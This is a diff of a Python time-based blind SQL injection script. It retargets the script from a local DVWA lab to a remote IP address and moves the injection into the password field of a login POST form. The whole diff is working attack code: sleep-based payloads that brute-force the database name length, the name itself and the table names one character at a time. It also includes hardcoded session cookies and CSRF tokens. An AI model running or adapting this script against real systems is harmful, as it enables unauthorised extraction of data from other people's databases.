@@ -9,8 +9,9 @@ made with <3 hha the picaro
 time = 3
 brutestring = string.ascii_letters+string.digits+"$^&*!@~_-#"
 brutestring2 = string.ascii_lowercase+string.digits
-url = "http://localhost:8080/DVWA/vulnerabilities/sqli_blind/?id=1"
-cookie = {'security':'low', 'LS-EWWZKYJCMHONCTIL':'ok8ol9lc7fc8bj3uidfggnp4pe', 'YII_CSRF_TOKEN':'aVdrNjJndnRwdEJETlh5TEd4Q2Y4d1dPV05nfjJuVVnlH-DKDvaNPLqJP4EnzYHyN2qBeFxVTFIIIPDKKZ-DUQ%3D%3D', 'PHPSESSID':'ijf1bktqtdoa704iaa9voc9u04'}
+url = "http://103.89.49.14/83ec8788fa53209e1baef6cda023ec55/index.php"
+# postdata = {'username':'133720','password':'dsfdsf','submit':'Login'}
+# cookie = {'security':'low', 'LS-EWWZKYJCMHONCTIL':'ok8ol9lc7fc8bj3uidfggnp4pe', 'YII_CSRF_TOKEN':'aVdrNjJndnRwdEJETlh5TEd4Q2Y4d1dPV05nfjJuVVnlH-DKDvaNPLqJP4EnzYHyN2qBeFxVTFIIIPDKKZ-DUQ%3D%3D', 'PHPSESSID':'ijf1bktqtdoa704iaa9voc9u04'}
 def countdb_length():
 	delimeter = "_" # 95 = _
 	global dblength
@@ -18,9 +19,12 @@ def countdb_length():
 	print("[!]Getting Database Length")
 	for i in range(1,15):#db length can be only 1 to 30, guess... 
 		deli = delimeter*i #_*2
-		payload = "' and (select sleep({}) and (select 1 from dual where database() like '{}')) and '1'='1&Submit=Submit".format(time,deli)
-		resp = requests.get(url+payload,cookies=cookie)
+		payload = "' and (select sleep({}) and (select 1 from dual where database() like '{}')) or '1'='1--+".format(time,deli)
+		postdata = {"username":"133720","password":"133720{}".format(payload),"submit":"Login"}
+		# print(postdata)
+		resp = requests.post(url,data = postdata)
 		rtext = resp.text
+		# print(rtext)
 		timetaken = resp.elapsed.total_seconds()
 		if timetaken >= time:
 			dblength = i
@@ -36,8 +40,9 @@ def getdb_name():
 		for s in brutestring:# a b c 
 			brutechar  = tmp + s # a
 			# print(brutechar)
-			payload = "' and (select sleep({}) and (select 1 from dual where database() like '{}%')) and '1'='1&Submit=Submit".format(time,brutechar)
-			resp = requests.get(url+payload,cookies=cookie)
+			payload = "' and (select sleep({}) and (select 1 from dual where database() like '{}%')) or '1'='1--+".format(time,brutechar)
+			postdata = {"username":"133720","password":"133720{}".format(payload),"submit":"Login"}
+			resp = requests.post(url,data = postdata)
 			timetaken = resp.elapsed.total_seconds()
 			if timetaken >= time:
 				tmp += s
@@ -130,8 +135,8 @@ def get_column():
 countdb_length()
 getdb_name()
 get_tables()
-# column_count()
-get_column()
+# # column_count()
+# get_column()
 
 # 1st loop key = f  string = a key+string = a 
 # second loop key = fa string = b key+ string = fab
